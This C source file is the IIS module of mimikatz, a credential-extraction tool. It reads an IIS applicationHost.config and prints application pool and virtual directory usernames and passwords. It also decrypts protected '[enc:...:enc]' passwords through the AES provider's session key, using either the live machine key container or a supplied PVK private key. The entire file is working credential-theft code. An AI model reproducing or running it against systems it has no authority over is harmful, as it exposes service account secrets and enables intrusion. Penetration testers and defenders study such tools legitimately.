/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_iis.h"

const KUHL_M_C kuhl_m_c_iis[] = {
	{kuhl_m_iis_apphost,	L"apphost",		NULL},
};

const KUHL_M kuhl_m_iis = {
	L"iis", L"IIS XML Config module", NULL,
	ARRAYSIZE(kuhl_m_c_iis), kuhl_m_c_iis, NULL, NULL
};

NTSTATUS kuhl_m_iis_apphost(int argc, wchar_t * argv[])
{
	PCWSTR filename;
	IXMLDOMDocument *pXMLDom;

	if(kull_m_string_args_byName(argc, argv, L"in", &filename, NULL))
	{
		if(pXMLDom = kull_m_xml_CreateAndInitDOM())
		{
			if(kull_m_xml_LoadXMLFile(pXMLDom, filename))
			{
				kuhl_m_iis_apphost_genericEnumNodes(argc, argv, pXMLDom, L"//configuration/system.applicationHost/applicationPools/add", IISXMLType_ApplicationPools, NULL, NULL, 0);
				kuhl_m_iis_apphost_genericEnumNodes(argc, argv, pXMLDom, L"//configuration/system.applicationHost/sites/site", IISXMLType_Sites, NULL, NULL, 0);
			}
			kull_m_xml_ReleaseDom(pXMLDom);
		}
	}
	else PRINT_ERROR(L"Missing /in:filename (applicationHost.config)\n");
	return STATUS_SUCCESS;
}

void kuhl_m_iis_apphost_genericEnumNodes(int argc, wchar_t * argv[], IXMLDOMDocument *pXMLDom, PCWSTR path, IISXMLType xmltype, LPCWSTR provider, LPCBYTE data, DWORD szData)
{
	IXMLDOMNodeList *pNodes;
	IXMLDOMNode *pNode;
	DOMNodeType type;
	BOOL mustBreak = FALSE;
	long length, i;

	if((IXMLDOMDocument_selectNodes(pXMLDom, (BSTR) path, &pNodes) == S_OK) && pNodes)
	{
		if(IXMLDOMNodeList_get_length(pNodes, &length) == S_OK)
		{
			for(i = 0; (i < length) && !mustBreak; i++)
			{
				if((IXMLDOMNodeList_get_item(pNodes, i, &pNode) == S_OK) && pNode)
				{
					if((IXMLDOMNode_get_nodeType(pNode, &type) == S_OK) && (type == NODE_ELEMENT))
					{
						switch(xmltype)
						{
						case IISXMLType_ApplicationPools:
							kuhl_m_iis_apphost_apppool(argc, argv, pXMLDom, pNode);
							break;
						case IISXMLType_Sites:
							kuhl_m_iis_apphost_site(argc, argv, pXMLDom, pNode);
							break;
						case IISXMLType_Providers:
							mustBreak = kuhl_m_iis_apphost_provider(argc, argv, pXMLDom, pNode, provider, data, szData);
							break;
						}
					}
					IXMLDOMNode_Release(pNode);
				}
			}
		}
	}
}

void kuhl_m_iis_apphost_apppool(int argc, wchar_t * argv[], IXMLDOMDocument *pXMLDom, IXMLDOMNode *pNode)
{
	PWSTR gen;
	IXMLDOMNode *pProcessModelNode;
	if(gen = kull_m_xml_getAttribute(pNode, L"name"))
	{
		kprintf(L"\n* ApplicationPool: \'%s\'\n", gen);
		LocalFree(gen);
		if((IXMLDOMNode_selectSingleNode(pNode, L"processModel", &pProcessModelNode) == S_OK) && pProcessModelNode)
		{
			if(gen = kull_m_xml_getAttribute(pProcessModelNode, L"userName"))
			{
				kprintf(L"  Username: %s\n", gen);
				LocalFree(gen);
				if(gen = kull_m_xml_getAttribute(pProcessModelNode, L"password"))
				{
					kprintf(L"  Password: %s\n", gen);
					kuhl_m_iis_maybeEncrypted(argc, argv, pXMLDom, gen);
					LocalFree(gen);
				}
			}
		}
	}
}

void kuhl_m_iis_apphost_site(int argc, wchar_t * argv[], IXMLDOMDocument *pXMLDom, IXMLDOMNode *pNode)
{
	PWSTR gen;
	IXMLDOMNodeList *pAppNodes, *pVdirNodes;
	IXMLDOMNode *pAppNode, *pVdirNode;
	DOMNodeType type;
	long lengthApp, lengthVdir, i, j;

	if(gen = kull_m_xml_getAttribute(pNode, L"name"))
	{
		kprintf(L"\n* Site: \'%s\'\n", gen);
		LocalFree(gen);
		if((IXMLDOMNode_selectNodes(pNode, L"application", &pAppNodes) == S_OK) && pAppNodes)
		{
			if(IXMLDOMNodeList_get_length(pAppNodes, &lengthApp) == S_OK)
			{
				for(i = 0; i < lengthApp; i++)
				{
					if((IXMLDOMNodeList_get_item(pAppNodes, i, &pAppNode) == S_OK) && pAppNode)
					{
						if((IXMLDOMNode_get_nodeType(pAppNode, &type) == S_OK) && (type == NODE_ELEMENT))
						{
							if(gen = kull_m_xml_getAttribute(pAppNode, L"path"))
							{
								kprintf(L"  > Application Path: %s\n", gen);
								LocalFree(gen);
								
								if((IXMLDOMNode_selectNodes(pAppNode, L"virtualDirectory", &pVdirNodes) == S_OK) && pVdirNodes)
								{
									if(IXMLDOMNodeList_get_length(pVdirNodes, &lengthVdir) == S_OK)
									{
										for(j = 0; j < lengthVdir; j++)
										{
											if((IXMLDOMNodeList_get_item(pVdirNodes, j, &pVdirNode) == S_OK) && pVdirNode)
											{
												if((IXMLDOMNode_get_nodeType(pVdirNode, &type) == S_OK) && (type == NODE_ELEMENT))
												{
													if(gen = kull_m_xml_getAttribute(pVdirNode, L"path"))
													{
														kprintf(L"    - VirtualDirectory Path: %s ( ", gen);
														LocalFree(gen);

														if(gen = kull_m_xml_getAttribute(pVdirNode, L"physicalPath"))
														{
															kprintf(L"%s", gen);
															LocalFree(gen);
														}
														kprintf(L" )\n");

														if(gen = kull_m_xml_getAttribute(pVdirNode, L"userName"))
														{
															kprintf(L"      Username: %s\n", gen);
															LocalFree(gen);
															if(gen = kull_m_xml_getAttribute(pVdirNode, L"password"))
															{
																kprintf(L"      Password: %s\n", gen);
																kuhl_m_iis_maybeEncrypted(argc, argv, pXMLDom, gen);
																LocalFree(gen);
															}
														}
													}
												}
												IXMLDOMNode_Release(pVdirNode);
											}
										}
									}
								}
							}
						}
						IXMLDOMNode_Release(pAppNode);
					}
				}
			}
		}
	}
}

void kuhl_m_iis_maybeEncrypted(int argc, wchar_t * argv[], IXMLDOMDocument *pXMLDom, PCWSTR password)
{
	BOOL status = FALSE;
	size_t passwordLen = wcslen(password), providerLen, dataLen;
	PCWCHAR pBeginProvider, pEndProvider, pBeginData, pEndData;
	PWCHAR provider, data;
	PBYTE binaryData;
	DWORD binaryDataLen;

	if(passwordLen > 10) // [enc:*:enc], and yes, I don't check all
	{
		if((_wcsnicmp(password, L"[enc:", 5) == 0) && (_wcsnicmp(password + (passwordLen - 5), L":enc]", 5) == 0))
		{
			pBeginProvider = password + 5;
			pEndProvider = wcschr(password + 5, L':');
			providerLen = (PBYTE) pEndProvider - (PBYTE) pBeginProvider;
			if(pEndProvider != (password + (passwordLen - 5)))
			{
				pBeginData = pEndProvider + 1;
				pEndData = password + (passwordLen - 5);
				dataLen = (PBYTE) pEndData - (PBYTE) pBeginData;
				if(provider = (PWCHAR) LocalAlloc(LPTR, providerLen + sizeof(wchar_t)))
				{
					RtlCopyMemory(provider, pBeginProvider, providerLen);
					if(data = (PWCHAR) LocalAlloc(LPTR, dataLen + sizeof(wchar_t)))
					{
						RtlCopyMemory(data, pBeginData, dataLen);
						kprintf(L"  | Provider  : %s\n  | Data      : %s\n", provider, data);

						if(kull_m_string_quick_base64_to_Binary(data, &binaryData, &binaryDataLen))
						{
							//kprintf(L"Binary    : ");
							//kull_m_string_wprintf_hex(binaryData, binaryDataLen, 0);
							//kprintf(L"\n");
							kuhl_m_iis_apphost_genericEnumNodes(argc, argv, pXMLDom, L"//configuration/configProtectedData/providers/add", IISXMLType_Providers, provider, binaryData, binaryDataLen);
							LocalFree(binaryData);
						}
						LocalFree(data);
					}
					LocalFree(provider);
				}
			}
		}
	}
}

BOOL kuhl_m_iis_apphost_provider(int argc, wchar_t * argv[], IXMLDOMDocument *pXMLDom, IXMLDOMNode *pNode, LPCWSTR provider, LPCBYTE data, DWORD szData)
{
	BOOL status = FALSE, isMachine = FALSE;
	PWSTR name, type, keyContainerName, useMachineContainer, sessionKey;
	PBYTE binaryData;
	DWORD binaryDataLen;

	if(name = kull_m_xml_getAttribute(pNode, L"name"))
	{
		if(status = _wcsicmp(name, provider) == 0)
		{
			if(type = kull_m_xml_getAttribute(pNode, L"type"))
			{
				if(_wcsicmp(type, L"Microsoft.ApplicationHost.AesProtectedConfigurationProvider") == 0)
				{
					if(keyContainerName = kull_m_xml_getAttribute(pNode, L"keyContainerName"))
					{
						kprintf(L"  | KeyName   : %s\n", keyContainerName);
						if(sessionKey = kull_m_xml_getAttribute(pNode, L"sessionKey"))
						{
							//kprintf(L"SessionKey: %s\n", sessionKey);
							if(useMachineContainer = kull_m_xml_getAttribute(pNode, L"useMachineContainer"))
							{
								isMachine = (_wcsicmp(useMachineContainer, L"true") == 0);
								LocalFree(useMachineContainer);
							}		
							if(kull_m_string_quick_base64_to_Binary(sessionKey, &binaryData, &binaryDataLen))
							{
								kuhl_m_iis_apphost_provider_decrypt(argc, argv, keyContainerName, isMachine, binaryData, binaryDataLen, data, szData);
								LocalFree(binaryData);
							}
							LocalFree(sessionKey);
						}
						LocalFree(keyContainerName);
					}
				}
				else /*if ... */
				{
					PRINT_ERROR(L"type is not supported (%s)\n", type);
				}
				LocalFree(type);
			}
			else
			{
				// TODO direct decryption without session key
			}
		}
		LocalFree(name);
	}
	return status;
}

void kuhl_m_iis_apphost_provider_decrypt(int argc, wchar_t * argv[], PCWSTR keyContainerName, BOOL isMachine, LPCBYTE sessionKey, DWORD szSessionKey, LPCBYTE data, DWORD szData)
{
	BOOL isLive;
	PBYTE liveData;
	DWORD szLiveData, szPvk;
	HCRYPTPROV hProv;
	HCRYPTKEY hKey = 0, hSessionKey;
	PPVK_FILE_HDR pvk = NULL;
	PCWSTR pvkName = NULL;

	isLive = kull_m_string_args_byName(argc, argv, L"live", NULL, NULL);
	if(!kull_m_string_args_byName(argc, argv, keyContainerName, &pvkName, NULL))
		kull_m_string_args_byName(argc, argv, L"pvk", &pvkName, NULL);

	if(isLive || pvkName)
	{
		if(liveData = (PBYTE) LocalAlloc(LPTR, szData))
		{
			RtlCopyMemory(liveData, data, szData);
			szLiveData = szData;
			if(isLive)
				kprintf(L"  | Live Key  : %s - %s : ", keyContainerName, isMachine ? L"machine" : L"user");
			if(CryptAcquireContext(&hProv, isLive ? keyContainerName : NULL, (MIMIKATZ_NT_BUILD_NUMBER <= KULL_M_WIN_BUILD_XP) ? MS_ENH_RSA_AES_PROV_XP : MS_ENH_RSA_AES_PROV , PROV_RSA_AES, (isLive ? 0 : CRYPT_VERIFYCONTEXT) | (isMachine ? CRYPT_MACHINE_KEYSET : 0)))
			{
				if(isLive)
					kprintf(L"OK\n");
				else
				{
					if(kull_m_file_readData(pvkName, (PBYTE *) &pvk, &szPvk))
					{
						kprintf(L"  | PVK file  : %s - \'%s\' : ", keyContainerName, pvkName);
						if(CryptImportKey(hProv, (PBYTE) pvk + sizeof(PVK_FILE_HDR), pvk->cbPvk, 0, 0, &hKey))
							kprintf(L"OK\n");
						else PRINT_ERROR_AUTO(L"CryptImportKey (RSA)");
					}
				}
				if(isLive || hKey)
				{
					if(CryptImportKey(hProv, sessionKey, szSessionKey, hKey, 0, &hSessionKey))
					{
						if(CryptDecrypt(hSessionKey, 0, FALSE, 0, liveData, &szLiveData))
						{
							kprintf(L"  | Password  : %s\n", liveData + sizeof(DWORD) /*CRC32 ? Random ?*/);
						}
						else PRINT_ERROR_AUTO(L"CryptDecrypt");
						CryptDestroyKey(hSessionKey);
					}
					else PRINT_ERROR_AUTO(L"CryptImportKey (session)");
				}
				if(!isLive)
				{
					if(hKey)
						CryptDestroyKey(hKey);
					if(pvk)
						LocalFree(pvk);
				}
				CryptReleaseContext(hProv, 0);
			}
			else PRINT_ERROR_AUTO(L"CryptAcquireContext");
			LocalFree(liveData);
		}
	}
}